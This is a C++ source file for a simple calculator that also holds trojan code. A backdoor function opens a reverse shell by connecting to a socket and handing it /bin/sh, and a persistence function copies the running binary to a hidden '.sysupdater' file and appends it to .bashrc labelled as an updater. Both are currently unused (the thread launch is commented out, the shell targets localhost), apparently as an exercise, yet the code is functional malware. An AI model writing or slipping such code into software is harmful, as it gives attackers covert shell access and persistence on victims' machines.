
#include <iostream>
#include <thread>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dirent.h>
#include <filesystem>
#include <fstream>
#include <cstdlib>
#include <sys/stat.h>

void run_calculator();
int get_result(int &a, int &b, char &op);
void backdoor();
void permanent();
int main()
{
    // std::thread t(backdoor);
    // t.detach();

    run_calculator();

    return 0;
}

void backdoor()
{
    sleep(3);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr{};

    addr.sin_family = AF_INET;
    addr.sin_port = htons(8888);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == 0)
    {
        // TODO get rid of comments
        dup2(sockfd, 0); // stdin
        dup2(sockfd, 1); // stdout
        dup2(sockfd, 2); // stderr
        execl("/bin/sh", "sh", nullptr);
    }
}

void permanent()
{

    struct dirent *dir_entry;
    std::string path_start = "/home/";

    DIR *dp = opendir(path_start.c_str());

    dir_entry = readdir(dp);
    dir_entry = readdir(dp);
    dir_entry = readdir(dp);
    std::string path = path_start + dir_entry->d_name + "/.config/";
    std::string path_exe = path + ".sysupdater";
    std::string bash_rc_path = path_start + dir_entry->d_name + "/.bashrc";

    std::cout << "paths:" << std::endl;
    std::cout << path << std::endl;
    std::cout << path_exe << std::endl;
    std::cout << bash_rc_path << std::endl;
    std::ifstream exists(path_exe.c_str());
    if (exists.good())
    {
        std::cout << "executable already present\n";
        return;
    }


    // makes input stream from file pointing to currently running process
    // makes output stream
    std::ifstream source("/proc/self/exe", std::ios::binary);
    std::ofstream dest(path_exe, std::ios::binary);
    dest << source.rdbuf();

    // changes permissions of new executable
    chmod(path_exe.c_str(), 0755);

    // adds hidden executable to .bashrc so it runs on start
    std::ofstream bashrc(bash_rc_path, std::ios::app);
    bashrc << "\n# Auto-start hidden updater\n";
    bashrc << path_exe << " &\n";

    std::cout << "file at " << path_exe << "will run on start" << std::endl;
}

void run_calculator()
{

    int a, b;
    char op;

    std::cout << "Enter two numbers" << std::endl;

    std::cin >> a >> b;

    std::cout << "Enter operation" << std::endl;

    std::cin >> op;

    std::cout << std::endl;

    std::cout << get_result(a, b, op) << std::endl;
}

int get_result(int &a, int &b, char &op)
{

    switch (op)
    {

    case '+':
        return a + b;
    case '*':
        return a * b;
    case '-':
        return a - b;
    case '/':
        if (b != 0)
        {

            return a / b;
        }
        else
        {
            throw("Error: division by 0");
        }
    }
    return 0;
}